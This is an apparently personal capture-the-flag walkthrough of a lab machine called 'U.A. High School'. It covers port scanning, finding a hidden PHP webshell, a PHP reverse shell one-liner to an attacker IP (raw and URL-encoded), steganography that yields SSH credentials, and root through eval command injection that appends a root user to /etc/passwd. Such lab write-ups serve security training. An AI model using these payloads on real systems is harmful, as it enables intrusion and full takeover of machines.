U.A. High School

Target IP: 10.10.152.29
Challenge Description:

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 10.10.152.29 -p- returns the result shown above. There are two TCP ports open on the target machine: SSH and HTTP on their standard ports. Time to perform an aggressive scan against these two TCP ports to identify its services & applications.


I performed an aggressive TCP port scan against the two TCP ports using the command sudo nmap -sV -A 10.10.152.29 -p 22,80 and obtained the result shown above. The web application on port 80 looks the most interesting to me. Therefore, I will start enumerating this application first.

Enumeration

Port 80: HTTP

The webpage above is returned for this web application. I noticed it has multiple hyperlinks. I read the source-code of the different pages, but I did not find anything useful. Time to perform a directory search.


I performed a directory search using the command gobuster dir -w /usr/share/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.152.29/ -x .php,.html,.txt and obtained the interesting result shown above. One interesting entry is /assets.


When I browse to http://10.10.152.29/assets/, an empty webpage is returned to me, as shown above. I enumerated this webpage further and found out it is a PHP webpage. I was expecting list of assets the web application is using like images. Is this possibly a PHP backdoor? I will need to enumerate this PHP webpage further.


One of the most popular parameter name is cmd. I tried this parameter name with the value as id and got a hit, as shown above. However, the output is encoded in base64.


I decoded the base64 string and obtained the output shown above. The /assets/index.php seems to be a PHP webshell. I can use this webshell to obtain a foothold on the target machine.

Exploitation

Foothold: Reverse Shell Connection via /assets/index.php PHP Webshell

php -r '$sock=fsockopen("10.14.87.142",8443);shell_exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("10.14.87.142",8443);shell_exec("sh <&3 >&3 2>&3");'

Since the target machine already has PHP installed, I can deploy the PHP reverse shell script shown above. But first, I will need to URL encode it. After URL encoding it, I obtained the following:

php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.87.142%22%2C8443%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.87.142%22%2C8443%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27


I started a listener on my machine at port 8443. Then I deployed the PHP reverse shell via the PHP webshell backdoor and obtained the result shown above. Now I have a foothold on the target machine as the user www-data. The full URL with the payload is http://10.10.152.29/assets/index.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%2210.14.87.142%22%2C8443)%3Bshell_exec(%22sh%20%3C%263%20%3E%263%202%3E%263%22)%3B%27. Then I upgraded my shell connection to an interactive using the command python3 -c 'import pty; pty.spawn("/bin/bash");'.

Privilege Escalation

Horizontal Privilege Escalation: www-data to deku via SSH Credentials (Tackling Steganography)

After landing a shell, I was located at the web directory of the web application. There is another interesting directory with the name Hidden_Content as shown above. Inside this directory, there is another text file with the name passphrase.txt as shown above. After decoding this, I obtained the string AllmightForEver!!!. However, when I tried to switch to the user deku using su and the password, I did not have any luck. However the name passhprase is commonly used with SSH keys, but I did not find anything either. I had to reset the box as I was having VPN issues. After resetting the box, it obtained the IP address of 10.10.216.70.


Inside the web directory, I noticed two interesting image files as shown above. I downloaded these two image files to my computer using the commands wget http://10.10.216.70/assets/images/yuei.jpg and wget http://10.10.216.70/assets/images/oneforall.jpg.


Right away, I notice the oneforall.jpg is corrupt, as there is no image preview for the thumbnail. I double-clicked on the image and obtained the error message above. It mentions the image bytes start with x89 0x50. This is a PNG file, not a JPG. Time to fix this issue first to see what the image is of.


Using hexedit, I inserted the correct bytes FF D8 FF E0 00 10 4A 46 49 46 00 01 to fix the image as shown above. Now I should be able to view the image.


The image itself was not interesting. However, it could be hiding files inside it using steganography. I checked for steganography inside the oneforall.jpg file using the command steghide extract -sf oneforall.jpg. Then I entered the passphrase AllmightForEver!!! and extracted the creds.txt file as shown above. This file contains the credentials deku:One?For?All_!!one1/A.


Then I used SSH to login to the target machine as the user deku, as shown above. Now I have successfully elevated my privileges from the user www-data to deku.

Vertical Privilege Escalation: deku to root via Command Injection Inside feedback.sh Script


Before elevating my privileges on the machine, when checking for scripts on the machine, I came across the interesting script shown above. This script has the name feedback.sh and it is located at /opt/NewComponent. The script seems to perform some sort of logging from the user input. The feedback (input) is checked to ensure it is clean from symbols such as :. Then comes the weakness, where the user input is directly fed into the echo function by the eval. The eval is the weakness and I can use command injection, such as overwriting the /etc/passwd file with my own user with root privileges.


Running the command sudo -l shows the same script /opt/NewComponent/feedback.sh can be executed. Perfect. Time to overwrite the /etc/passwd file.


Using the command openssl passwd rooted, I created the encrypted password wAatgAYt3wuOE for the plaintext rooted. Then I ran the feedback.sh script using the command sudo /opt/NewComponent/feedback.sh. Afterwards, I deployed the payload 'super:wAatgAYt3wuOE:0:0:root:/root:/bin/bash' >> /etc/passwd. This payload inserts the user super with root privileges. This user's password is rooted. Now it is time to switch user to super.


And bingo. Using su super and the password rooted, I now have root privileges on the target machine as shown above. GG.
